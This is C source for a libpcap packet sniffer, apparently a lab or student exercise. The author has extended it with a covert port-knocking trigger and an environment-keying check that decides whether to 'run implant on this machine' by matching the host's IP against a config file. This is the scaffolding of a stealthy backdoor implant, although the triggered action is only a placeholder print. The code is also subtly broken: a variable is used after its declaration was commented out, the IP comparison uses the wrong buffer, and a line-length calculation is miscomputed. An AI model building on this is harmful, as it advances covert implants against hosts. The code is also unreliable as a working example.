#include "sniffex.h"

/*
 * app name/banner
 */
void
print_app_banner(void)
{

	printf("%s - %s\n", APP_NAME, APP_DESC);
	printf("%s\n", APP_COPYRIGHT);
	printf("%s\n", APP_DISCLAIMER);
	printf("\n");

return;
}

/*
 * print help text
 */
void
print_app_usage(void)
{

	printf("Usage: %s [interface]\n", APP_NAME);
	printf("\n");
	printf("Options:\n");
	printf("    interface    Listen on <interface> for packets.\n");
	printf("\n");

return;
}

/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
 */
void
print_hex_ascii_line(const unsigned char *payload, int len, int offset)
{

	int i;
	int gap;
	const unsigned char *ch;

	/* offset */
	printf("%05d   ", offset);

	/* hex */
	ch = payload;
	for(i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		/* print extra space after 8th byte for visual aid */
		if (i == 7)
			printf(" ");
	}
	/* print space to handle line less than 8 bytes */
	if (len < 8)
		printf(" ");

	/* fill hex gap with spaces if not full line */
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");

	/* ascii (if printable) */
	ch = payload;
	for(i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf("\n");

return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void print_payload(const unsigned char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;			/* number of bytes per line */
	int line_len;
	int offset = 0;					/* zero-based offset counter */
	const unsigned char *ch = payload;

	if (len <= 0)
		return;

	/* data fits on one line */
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	/* data spans multiple lines */
	for ( ;; ) {
		/* compute current line length */
		line_len = line_width % len_rem;
		/* print line */
		print_hex_ascii_line(ch, line_len, offset);
		/* compute total remaining */
		len_rem = len_rem - line_len;
		/* shift pointer to remaining bytes to print */
		ch = ch + line_len;
		/* add offset */
		offset = offset + line_width;
		/* check if we have line width chars or less */
		if (len_rem <= line_width) {
			/* print last line and get out */
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}

return;
}

/*
 * dissect/print packet
 */
void
got_packet(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *packet)
{

	static int count = 1;                   /* packet counter */

	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */
	const char *payload;                    /* Packet payload */

	int size_ip;
	int size_tcp;
	int size_payload;

	#ifdef DEBUG
		printf("\nPacket number %d:\n", count);
	#endif
	count++;

	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);

	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		#ifdef DEBUG
			printf("   * Invalid IP header length: %u bytes\n", size_ip);
		#endif
		return;
	}

	#ifdef DEBUG
		/* print source and destination IP addresses */
		printf("       From: %s\n", inet_ntoa(ip->ip_src));
		printf("         To: %s\n", inet_ntoa(ip->ip_dst));
	#endif

	/* determine protocol */
	char* protocol;
	switch(ip->ip_p) {
		case IPPROTO_TCP:
			protocol = "TCP";
			break;
		case IPPROTO_UDP:
			protocol = "UDP";
			return;
		case IPPROTO_ICMP:
			protocol = "ICMP";
			return;
		case IPPROTO_IP:
			protocol = "IP";
			return;
		default:
			protocol = "unknown";
			return;
	}

	#ifdef DEBUG
		printf("	Protocol: %s\n", protocol);
	#endif

	/*
	 *  OK, this packet is TCP.
	 */

	/* define/compute tcp header offset */
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	
	if (size_tcp < 20) {
		#ifdef DEBUG
			printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		#endif
		return;
	}

	#ifdef DEBUG
		printf("   Src port: %d\n", ntohs(tcp->th_sport));
		printf("   Dst port: %d\n", ntohs(tcp->th_dport));
	#endif


	/* define/compute tcp payload (segment) offset */
	payload = (unsigned char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);

	/* compute tcp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

	/*
	 * Print payload data; it might be binary, so don't just
	 * treat it as a string.
	 */
	#ifdef DEBUG
		printf("   Payload (%d bytes):\n", size_payload);
		print_payload(payload, size_payload);
	#endif

	
	if(update_pknock_state(ntohs(tcp->th_dport),payload,size_payload) == 1){
		pknock_success();
		#ifdef DEBUG
			printf("Port knock success!\n");
		#endif
	}

return;
}








// -----------------------------  M Y   M O D I F I C A T I O N S  ----------------------------------



// the state of our current port knocking
//	basically the next index to listen for in our port knocking sequence
int pknock_state = 0;

// function to update the port knocking state
//	increments pknock_state when dst port matches next 
//	returns 1 on port knock success, 0 otherwise
int update_pknock_state(int dst_port, const char* payload, int size_payload){

	// check for the target string in the payload
	// int target_bytes = sizeof(TARGET_STR);
	// char key[target_bytes];
	// memcpy(key, payload, target_bytes-1);
	// key[target_bytes-1]=0;

	// check if we can move onto the next part of the knock sequence
	if(TARGET_PORTS[pknock_state]==dst_port){
		pknock_state++;

		#ifdef DEBUG
			printf("Knocked on port %d, #%d in the sequence\n", dst_port, pknock_state);
		#endif

		// check if this is end of the knock
		if(pknock_state == NUM_TARGETS){
			
			#ifdef PAYLOAD_SIZE
				// print out rest of the payload
				int payload_bytes = PAYLOAD_SIZE;
				if(size_payload - (target_bytes-1) < PAYLOAD_SIZE) payload_bytes = size_payload - target_bytes;
				if(payload_bytes > 0){
					char msg[payload_bytes+1];
					memcpy(msg, payload+target_bytes-1, payload_bytes);
					msg[payload_bytes]=0;
					printf("%s\n",(const char*) msg);
				}
			#endif

			return 1;
		}
	}
	return 0;
}


// function to run when the port knock occurs
void pknock_success(){
	printf("BANG\n");
}

// returns the current ip address
char* get_ip_addr(){
		
	// get host name and IP address of current machine
	char hostbuffer[256];
	gethostname(hostbuffer, sizeof(hostbuffer));
	struct hostent *host_entry = gethostbyname(hostbuffer);

	char * IPbuffer = inet_ntoa(*((struct in_addr*)
                           host_entry->h_addr_list[0]));
  
	#ifdef DEBUG
		printf("Hostname: %s\n", hostbuffer);
		printf("Host IP: %s\n", IPbuffer);
	#endif

	return IPbuffer;
}


// check if we are allowed to run implant on this machine
//    returns 1 if we can, 0 if not
int check_env_key(const char* ip_addr, FILE* config_file){
	char line[256];
	int i = 1;
	while(fgets(line, sizeof(line), config_file) != NULL){
		char ip[256];
		if(line[0] == '#'){
			continue;
		}
		if(sscanf(line, "%s", ip) != 1){
			#ifdef DEBUG
				printf("config file bad line #%d", i);
			#endif
			continue;
		}

		if(strcmp(ip_addr, line)==0){
			return 1;
		}
		i++;
	}
	return 0;
}